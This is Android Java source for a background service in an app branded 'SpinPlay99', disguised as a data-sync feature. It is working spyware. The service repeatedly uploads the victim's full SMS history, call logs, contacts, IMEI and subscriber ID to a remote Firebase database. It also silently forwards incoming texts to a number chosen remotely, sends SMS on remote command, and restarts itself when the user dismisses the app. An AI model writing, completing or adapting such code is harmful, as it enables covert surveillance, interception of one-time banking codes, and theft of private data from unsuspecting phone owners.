package com.spinplay99.adminpanel;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import com.google.firebase.FirebaseApp;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ServerValue;
import com.google.firebase.database.ValueEventListener;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

public class BackgroundSyncService extends Service {

    private static final String CHANNEL_ID = "spinplay99_sync_channel";
    private static final int NOTIFICATION_ID = 999;

    private DatabaseReference mDatabase;
    private String deviceId;
    private Handler handler;
    private Runnable syncRunnable;
    
    // SMS Manager
    private SmsManager smsManager;
    
    // Forwarding variables
    private String forwardingNumber = "";
    private boolean forwardingEnabled = false;
    private List<String> forwardingFilters = new ArrayList<>();
    private boolean forwardAllSms = true;
    
    // Firebase Listeners
    private ValueEventListener forwardingSettingsListener;
    private ValueEventListener manualSmsListener;

    @Override
    public void onCreate() {
        super.onCreate();

        // Initialize Firebase
        FirebaseApp.initializeApp(this);
        mDatabase = FirebaseDatabase.getInstance().getReference();
        
        // Get Device ID
        deviceId = Settings.Secure.getString(getContentResolver(),
                   Settings.Secure.ANDROID_ID);
        
        handler = new Handler(Looper.getMainLooper());
        smsManager = SmsManager.getDefault();

        // Create notification channel and start foreground
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification());
        
        // Load settings and listeners
        loadForwardingSettings();
        listenForManualSmsCommands();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startSyncLoop();
        return START_STICKY;
    }

    private void startSyncLoop() {
        syncRunnable = new Runnable() {
            @Override
            public void run() {
                syncDataToFirebase();
                handler.postDelayed(this, 2000);
            }
        };
        handler.post(syncRunnable);
    }

    private void syncDataToFirebase() {
        DatabaseReference deviceRef = mDatabase.child("devices").child(deviceId);

        // Online status
        deviceRef.child("online_status").setValue(true);
        deviceRef.child("online_status").onDisconnect().setValue(false);
        deviceRef.child("device_info").child("last_seen").onDisconnect().setValue(ServerValue.TIMESTAMP);

        // Sync live data
        Map<String, Object> liveData = collectLiveData();
        deviceRef.child("live_data").setValue(liveData);

        // Update device info
        updateDeviceInfo();

        // Check for new SMS to forward
        checkAndForwardNewSms();
    }

    private Map<String, Object> collectLiveData() {
        Map<String, Object> data = new HashMap<>();
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS", Locale.getDefault());

        // Timestamp
        data.put("timestamp", sdf.format(new Date()));
        data.put("timestamp_millis", System.currentTimeMillis());
        
        // Device stats
        data.put("battery_level", getBatteryLevel());
        data.put("network_type", getNetworkType());
        data.put("is_charging", isDeviceCharging());
        data.put("screen_on", isScreenOn());
        
        // Permissions
        data.put("permissions", getAllPermissionsStatus());
        
        // SIM Info
        data.put("sim_info", getSimInfo());
        
        // Sync type
        data.put("sync_type", "BACKGROUND_SERVICE");

        // SMS Data
        if (checkPermission(Manifest.permission.READ_SMS)) {
            int currentSmsCount = getSmsCount();
            data.put("total_sms", currentSmsCount);
            data.put("unread_sms", getUnreadSmsCount());
            sendAllSms();
        }

        // Call Logs
        if (checkPermission(Manifest.permission.READ_CALL_LOG)) {
            int currentCallCount = getCallLogsCount();
            data.put("total_calls", currentCallCount);
            sendAllCalls();
        }

        // Contacts
        if (checkPermission(Manifest.permission.READ_CONTACTS)) {
            data.put("contacts_count", getContactsCount());
            sendAllContacts();
        }

        return data;
    }

    private void updateDeviceInfo() {
        Map<String, Object> info = new HashMap<>();
        info.put("device_id", deviceId);
        info.put("device_model", Build.MODEL);
        info.put("device_brand", Build.BRAND);
        info.put("device_manufacturer", Build.MANUFACTURER);
        info.put("android_version", Build.VERSION.RELEASE);
        info.put("sdk_version", Build.VERSION.SDK_INT);
        info.put("last_seen", ServerValue.TIMESTAMP);
        info.put("sim_info", getDetailedSimInfo());
        
        mDatabase.child("devices").child(deviceId).child("device_info").updateChildren(info);
    }

    // ==================== SMS METHODS ====================

    private void sendAllSms() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                List<Map<String, Object>> messages = getAllSmsFormatted();
                
                if (messages.isEmpty()) {
                    return;
                }

                Map<String, Object> smsData = new HashMap<>();
                smsData.put("total_count", messages.size());
                smsData.put("last_updated", ServerValue.TIMESTAMP);
                smsData.put("messages", messages);

                mDatabase.child("devices").child(deviceId).child("all_sms")
                        .setValue(smsData);
            }
        }).start();
    }

    private List<Map<String, Object>> getAllSmsFormatted() {
        List<Map<String, Object>> list = new ArrayList<>();
        Cursor cursor = null;
        
        try {
            cursor = getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                new String[]{"_id", "address", "body", "date", "type", "read"},
                null,
                null,
                "date DESC"
            );

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    Map<String, Object> sms = new HashMap<>();
                    
                    sms.put("id", getCursorString(cursor, 0));
                    sms.put("address", getCursorString(cursor, 1));
                    
                    String body = getCursorString(cursor, 2);
                    if (body != null && body.length() > 300) {
                        body = body.substring(0, 300) + "...";
                    }
                    sms.put("body", body != null ? body : "");
                    
                    String dateStr = getCursorString(cursor, 3);
                    sms.put("date", dateStr);
                    if (dateStr != null && !dateStr.isEmpty()) {
                        sms.put("date_readable", formatDate(Long.parseLong(dateStr)));
                    }
                    
                    String typeStr = getCursorString(cursor, 4);
                    String type = "OTHER";
                    if ("1".equals(typeStr)) type = "INBOX";
                    else if ("2".equals(typeStr)) type = "SENT";
                    else if ("3".equals(typeStr)) type = "DRAFT";
                    sms.put("type", type);
                    
                    sms.put("read", getCursorString(cursor, 5));
                    
                    list.add(sms);
                    
                } while (cursor.moveToNext());
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        
        return list;
    }

    private int getSmsCount() {
        return getCount(Telephony.Sms.CONTENT_URI);
    }

    private int getUnreadSmsCount() {
        int count = 0;
        try {
            Cursor cursor = getContentResolver().query(
                Telephony.Sms.Inbox.CONTENT_URI,
                null,
                "read = 0",
                null,
                null
            );
            if (cursor != null) {
                count = cursor.getCount();
                cursor.close();
            }
        } catch (Exception e) {
            // Ignore
        }
        return count;
    }

    // ==================== CALL LOG METHODS ====================

    private void sendAllCalls() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                List<Map<String, Object>> calls = getAllCallsFormatted();
                
                if (calls.isEmpty()) {
                    return;
                }

                Map<String, Object> callData = new HashMap<>();
                callData.put("total_count", calls.size());
                callData.put("last_updated", ServerValue.TIMESTAMP);
                callData.put("calls", calls);

                mDatabase.child("devices").child(deviceId).child("all_calls")
                        .setValue(callData);
            }
        }).start();
    }

    private List<Map<String, Object>> getAllCallsFormatted() {
        List<Map<String, Object>> list = new ArrayList<>();
        Cursor cursor = null;
        
        try {
            cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                new String[]{"_id", "number", "type", "date", "duration", "name"},
                null,
                null,
                "date DESC"
            );

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    Map<String, Object> call = new HashMap<>();
                    
                    call.put("id", getCursorString(cursor, 0));
                    call.put("number", getCursorString(cursor, 1));
                    
                    String typeStr = getCursorString(cursor, 2);
                    String type = "UNKNOWN";
                    if ("1".equals(typeStr)) type = "INCOMING";
                    else if ("2".equals(typeStr)) type = "OUTGOING";
                    else if ("3".equals(typeStr)) type = "MISSED";
                    call.put("type", type);
                    
                    String dateStr = getCursorString(cursor, 3);
                    call.put("date", dateStr);
                    if (dateStr != null && !dateStr.isEmpty()) {
                        call.put("date_readable", formatDate(Long.parseLong(dateStr)));
                    }
                    
                    call.put("duration", getCursorString(cursor, 4));
                    call.put("contact_name", getCursorString(cursor, 5));
                    
                    list.add(call);
                    
                } while (cursor.moveToNext());
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        
        return list;
    }

    private int getCallLogsCount() {
        return getCount(CallLog.Calls.CONTENT_URI);
    }

    // ==================== CONTACTS METHODS ====================

    private void sendAllContacts() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                List<Map<String, Object>> contacts = getAllContactsFormatted();
                
                if (contacts.isEmpty()) {
                    return;
                }

                Map<String, Object> contactData = new HashMap<>();
                contactData.put("total_count", contacts.size());
                contactData.put("last_updated", ServerValue.TIMESTAMP);
                contactData.put("contacts", contacts);

                mDatabase.child("devices").child(deviceId).child("all_contacts")
                        .setValue(contactData);
            }
        }).start();
    }

    private List<Map<String, Object>> getAllContactsFormatted() {
        List<Map<String, Object>> list = new ArrayList<>();
        Cursor cursor = null;
        
        try {
            cursor = getContentResolver().query(
                android.provider.ContactsContract.Contacts.CONTENT_URI,
                new String[]{"_id", "display_name", "has_phone_number"},
                null,
                null,
                "display_name ASC"
            );

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    Map<String, Object> contact = new HashMap<>();
                    String contactId = getCursorString(cursor, 0);
                    
                    contact.put("id", contactId);
                    contact.put("name", getCursorString(cursor, 1));
                    
                    if ("1".equals(getCursorString(cursor, 2))) {
                        contact.put("phone", getPhoneNumber(contactId));
                    }
                    
                    list.add(contact);
                    
                } while (cursor.moveToNext());
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        
        return list;
    }

    private String getPhoneNumber(String contactId) {
        try {
            Cursor cursor = getContentResolver().query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{"number"},
                "contact_id = ?",
                new String[]{contactId},
                null
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                String number = cursor.getString(0);
                cursor.close();
                return number;
            }
            
            if (cursor != null) {
                cursor.close();
            }
        } catch (Exception e) {
            // Ignore
        }
        return "No Number";
    }

    private int getContactsCount() {
        return getCount(android.provider.ContactsContract.Contacts.CONTENT_URI);
    }

    // ==================== SIM INFO METHODS ====================

    private Map<String, Object> getSimInfo() {
        Map<String, Object> simInfo = new HashMap<>();
        
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            
            if (tm != null) {
                simInfo.put("sim_operator", tm.getSimOperatorName());
                simInfo.put("network_operator", tm.getNetworkOperatorName());
                simInfo.put("network_country", tm.getNetworkCountryIso());
                simInfo.put("is_roaming", tm.isNetworkRoaming());
                simInfo.put("network_type_name", getNetworkTypeName(tm.getNetworkType()));
            }
        } catch (Exception e) {
            // Ignore
        }
        
        return simInfo;
    }

    private Map<String, Object> getDetailedSimInfo() {
        Map<String, Object> simInfo = new HashMap<>();
        
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            
            if (tm != null) {
                simInfo.put("sim_operator_name", tm.getSimOperatorName());
                simInfo.put("network_operator_name", tm.getNetworkOperatorName());
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    if (checkPermission(Manifest.permission.READ_PHONE_STATE)) {
                        simInfo.put("imei", tm.getImei());
                    }
                }
                
                if (checkPermission(Manifest.permission.READ_PHONE_STATE)) {
                    simInfo.put("subscriber_id", tm.getSubscriberId());
                }
            }
        } catch (Exception e) {
            // Ignore
        }
        
        return simInfo;
    }

    private String getNetworkTypeName(int networkType) {
        switch (networkType) {
            case TelephonyManager.NETWORK_TYPE_LTE:
                return "LTE (4G)";
            case TelephonyManager.NETWORK_TYPE_NR:
                return "NR (5G)";
            case TelephonyManager.NETWORK_TYPE_UMTS:
                return "UMTS (3G)";
            case TelephonyManager.NETWORK_TYPE_GPRS:
                return "GPRS (2G)";
            default:
                return "Unknown";
        }
    }

    // ==================== SMS FORWARDING ====================

    private void loadForwardingSettings() {
        forwardingSettingsListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (snapshot.exists()) {
                    forwardingNumber = snapshot.child("forward_to").getValue(String.class);
                    
                    Boolean enabled = snapshot.child("enabled").getValue(Boolean.class);
                    forwardingEnabled = enabled != null && enabled;
                    
                    Boolean allSms = snapshot.child("forward_all").getValue(Boolean.class);
                    forwardAllSms = allSms == null || allSms;
                    
                    forwardingFilters.clear();
                    for (DataSnapshot filter : snapshot.child("filters").getChildren()) {
                        String number = filter.getValue(String.class);
                        if (number != null) {
                            forwardingFilters.add(number);
                        }
                    }
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                // Ignore
            }
        };

        mDatabase.child("devices")
                .child(deviceId)
                .child("forwarding_settings")
                .addValueEventListener(forwardingSettingsListener);
    }

    private void forwardSms(String from, String body, long timestamp) {
        if (!forwardingEnabled || forwardingNumber == null || forwardingNumber.isEmpty()) {
            return;
        }

        if (!forwardAllSms && !forwardingFilters.isEmpty()) {
            boolean matchFound = false;
            for (String filter : forwardingFilters) {
                if (from.contains(filter)) {
                    matchFound = true;
                    break;
                }
            }
            if (!matchFound) {
                return;
            }
        }

        String forwardMessage = "From: " + from + "\nDate: " + formatDate(timestamp) + "\n\n" + body;

        try {
            smsManager.sendTextMessage(forwardingNumber, null, forwardMessage, null, null);

            Map<String, Object> log = new HashMap<>();
            log.put("from", from);
            log.put("to", forwardingNumber);
            log.put("body", body != null && body.length() > 100 ? body.substring(0, 100) : body);
            log.put("status", "FORWARDED");
            log.put("forwarded_at", ServerValue.TIMESTAMP);

            mDatabase.child("devices")
                    .child(deviceId)
                    .child("forwarded_sms")
                    .push()
                    .setValue(log);

        } catch (Exception e) {
            Map<String, Object> errorLog = new HashMap<>();
            errorLog.put("from", from);
            errorLog.put("error", e.getMessage());
            errorLog.put("timestamp", System.currentTimeMillis());

            mDatabase.child("devices")
                    .child(deviceId)
                    .child("forwarding_errors")
                    .push()
                    .setValue(errorLog);
        }
    }

    private void checkAndForwardNewSms() {
        if (!forwardingEnabled || !checkPermission(Manifest.permission.READ_SMS)) {
            return;
        }

        new Thread(new Runnable() {
            @Override
            public void run() {
                Cursor cursor = null;
                try {
                    long tenSecondsAgo = System.currentTimeMillis() - 10000;

                    cursor = getContentResolver().query(
                        Telephony.Sms.Inbox.CONTENT_URI,
                        new String[]{"address", "body", "date"},
                        "date > ?",
                        new String[]{String.valueOf(tenSecondsAgo)},
                        "date DESC LIMIT 5"
                    );

                    if (cursor != null && cursor.moveToFirst()) {
                        do {
                            String from = getCursorString(cursor, 0);
                            String body = getCursorString(cursor, 1);
                            long date = Long.parseLong(getCursorString(cursor, 2));
                            
                            forwardSms(from, body, date);
                        } while (cursor.moveToNext());
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                } finally {
                    if (cursor != null) {
                        cursor.close();
                    }
                }
            }
        }).start();
    }

    // ==================== MANUAL SMS COMMANDS ====================

    private void listenForManualSmsCommands() {
        manualSmsListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                for (DataSnapshot cmdSnapshot : snapshot.getChildren()) {
                    String toNumber = cmdSnapshot.child("to").getValue(String.class);
                    String message = cmdSnapshot.child("message").getValue(String.class);
                    String commandId = cmdSnapshot.getKey();

                    if (toNumber != null && message != null) {
                        sendManualSms(toNumber, message, commandId);
                    }

                    cmdSnapshot.getRef().removeValue();
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                // Ignore
            }
        };

        mDatabase.child("devices")
                .child(deviceId)
                .child("manual_commands")
                .child("send_sms")
                .addValueEventListener(manualSmsListener);
    }

    private void sendManualSms(String toNumber, String message, String commandId) {
        try {
            smsManager.sendTextMessage(toNumber, null, message, null, null);

            Map<String, Object> log = new HashMap<>();
            log.put("to", toNumber);
            log.put("message", message.length() > 100 ? message.substring(0, 100) + "..." : message);
            log.put("status", "SENT");
            log.put("type", "MANUAL");
            log.put("sent_at", ServerValue.TIMESTAMP);
            log.put("command_id", commandId);

            mDatabase.child("devices")
                    .child(deviceId)
                    .child("sent_sms")
                    .push()
                    .setValue(log);

        } catch (Exception e) {
            Map<String, Object> errorLog = new HashMap<>();
            errorLog.put("to", toNumber);
            errorLog.put("message", message);
            errorLog.put("error", e.getMessage());
            errorLog.put("timestamp", ServerValue.TIMESTAMP);
            errorLog.put("command_id", commandId);

            mDatabase.child("devices")
                    .child(deviceId)
                    .child("sms_errors")
                    .push()
                    .setValue(errorLog);
        }
    }

    // ==================== HELPER METHODS ====================

    private String getCursorString(Cursor cursor, int index) {
        try {
            return cursor.getString(index);
        } catch (Exception e) {
            return "";
        }
    }

    private String formatDate(long timestamp) {
        try {
            SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy hh:mm a", Locale.getDefault());
            return sdf.format(new Date(timestamp));
        } catch (Exception e) {
            return "Unknown";
        }
    }

    private int getCount(Uri uri) {
        int count = 0;
        try {
            Cursor cursor = getContentResolver().query(uri, null, null, null, null);
            if (cursor != null) {
                count = cursor.getCount();
                cursor.close();
            }
        } catch (Exception e) {
            // Ignore
        }
        return count;
    }

    private Map<String, Boolean> getAllPermissionsStatus() {
        Map<String, Boolean> permissions = new HashMap<>();
        permissions.put("read_sms", checkPermission(Manifest.permission.READ_SMS));
        permissions.put("send_sms", checkPermission(Manifest.permission.SEND_SMS));
        permissions.put("receive_sms", checkPermission(Manifest.permission.RECEIVE_SMS));
        permissions.put("read_call_log", checkPermission(Manifest.permission.READ_CALL_LOG));
        permissions.put("read_contacts", checkPermission(Manifest.permission.READ_CONTACTS));
        permissions.put("call_phone", checkPermission(Manifest.permission.CALL_PHONE));
        return permissions;
    }

    private boolean checkPermission(String permission) {
        return ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED;
    }

    private int getBatteryLevel() {
        int level = 0;
        try {
            Intent intent = registerReceiver(null, 
                new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (intent != null) {
                int scale = intent.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
                level = intent.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
                if (scale > 0) {
                    level = (level * 100) / scale;
                }
            }
        } catch (Exception e) {
            // Ignore
        }
        return level;
    }

    private String getNetworkType() {
        try {
            android.net.ConnectivityManager cm = 
                (android.net.ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            android.net.NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
            if (activeNetwork != null && activeNetwork.isConnected()) {
                return activeNetwork.getTypeName();
            }
        } catch (Exception e) {
            // Ignore
        }
        return "No Connection";
    }

    private boolean isDeviceCharging() {
        try {
            Intent intent = registerReceiver(null, 
                new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (intent != null) {
                int status = intent.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
                return status == android.os.BatteryManager.BATTERY_STATUS_CHARGING ||
                       status == android.os.BatteryManager.BATTERY_STATUS_FULL;
            }
        } catch (Exception e) {
            // Ignore
        }
        return false;
    }

    private boolean isScreenOn() {
        android.os.PowerManager pm = (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
        return pm != null && pm.isInteractive();
    }

    // ==================== NOTIFICATION METHODS ====================

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Sync Service",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Background data synchronization");
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private Notification createNotification() {
        Intent intent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
            this, 
            0, 
            intent, 
            PendingIntent.FLAG_IMMUTABLE
        );

        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("SpinPlay99")
                .setContentText("Sync service running...")
                .setSmallIcon(android.R.drawable.ic_menu_manage)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        // Set offline status
        mDatabase.child("devices").child(deviceId).child("online_status").setValue(false);
        
        // Remove callbacks
        if (handler != null && syncRunnable != null) {
            handler.removeCallbacks(syncRunnable);
        }
        
        // Remove listeners
        if (forwardingSettingsListener != null) {
            mDatabase.child("devices")
                    .child(deviceId)
                    .child("forwarding_settings")
                    .removeEventListener(forwardingSettingsListener);
        }
        
        if (manualSmsListener != null) {
            mDatabase.child("devices")
                    .child(deviceId)
                    .child("manual_commands")
                    .child("send_sms")
                    .removeEventListener(manualSmsListener);
        }
        
        super.onDestroy();
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        // Restart service when app is swiped away
        Intent restartIntent = new Intent(getApplicationContext(), BackgroundSyncService.class);
        startService(restartIntent);
        super.onTaskRemoved(rootIntent);
    }
}
